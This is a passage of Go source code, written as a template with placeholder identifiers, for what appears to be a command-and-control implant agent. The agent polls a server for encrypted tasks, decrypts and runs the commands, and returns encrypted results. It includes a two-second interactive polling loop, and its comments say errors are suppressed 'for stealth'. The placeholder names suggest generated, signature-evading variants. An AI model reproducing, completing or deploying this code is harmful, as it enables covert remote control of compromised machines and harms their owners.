func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" {
		tasks := resp.Tasks
		for i := range tasks {
			if a.{AGENT_SECRET_KEY_FIELD} != nil {
				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
				if err == nil {
					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
				} else {
				}
			} else {
			}
		}
		return tasks, nil
	}

	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_INTERACTIVE_STATUS_FUNC}() (bool, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_STATUS_URI_FIELD}, nil)
	if err != nil {
		return false, err
	}

	if resp.Status == "success" {
		return resp.InteractiveMode, nil
	}

	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" && resp.Command != "" {
		taskID, err := strconv.ParseInt(resp.TaskID, 10, 64)
		if err != nil {
			taskID = 0 // Default to 0 if parsing fails
		}

		task := &{TASK_STRUCT_NAME}{
			{TASK_ID_FIELD}:      taskID,
			{TASK_COMMAND_FIELD}: resp.Command,
		}

		if a.{AGENT_SECRET_KEY_FIELD} != nil {
			decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
			if err == nil {
				task.{TASK_COMMAND_FIELD} = decryptedCmd
			}
		}

		return task, nil
	}

	return nil, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_INTERACTIVE_URI_FIELD}, data)
	return err
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		} else {
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
	if err != nil {
		return err
	} else {
		if resp != nil {
		}
	}
	return nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_START_INTERACTIVE_POLLING_FUNC}() {
	if a.{AGENT_INTERACTIVE_POLLING_FIELD} {
		return
	}

	a.{AGENT_INTERACTIVE_POLLING_FIELD} = true

	// Create channels and waitgroup for managing the polling goroutine
	stopChan := make(chan struct{})
	a.{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD} = stopChan
	wg := &sync.WaitGroup{}
	a.{AGENT_INTERACTIVE_POLLING_THREAD_FIELD} = wg

	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-stopChan:
				return
			default:
				// Check if we're still in interactive mode
				if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
					return
				}

				// Get interactive command
				interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
				if err != nil {
					// Failed to get interactive command, but don't print anything for stealth
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else if interactiveTask != nil {
					result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
					taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
					err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
					if err != nil {
						// Failed to submit interactive result, but don't print anything for stealth
						a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
					} else {
						a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
					}
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset when no task but no error
				}

				// Sleep for 2 seconds in interactive mode
				time.Sleep(2 * time.Second)
			}
		}
	}()
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_INTERACTIVE_POLLING_FUNC}() {
	if !a.{AGENT_INTERACTIVE_POLLING_FIELD} {
		return
	}

	a.{AGENT_INTERACTIVE_POLLING_FIELD} = false

	// Stop the polling goroutine if it exists
	if a.{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD} != nil {
		close(a.{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD})
		a.{AGENT_INTERACTIVE_POLLING_STOP_CHAN_FIELD} = nil
	}

	// Wait for the goroutine to finish if we have a waitgroup
	if a.{AGENT_INTERACTIVE_POLLING_THREAD_FIELD} != nil {
		done := make(chan struct{})
		go func() {
			defer close(done)
			a.{AGENT_INTERACTIVE_POLLING_THREAD_FIELD}.Wait()
		}()

		select {
		case <-done:
			// Goroutine finished
		case <-time.After(10 * time.Second):
			// Timeout waiting for goroutine to finish
		}
		a.{AGENT_INTERACTIVE_POLLING_THREAD_FIELD} = nil
	}
}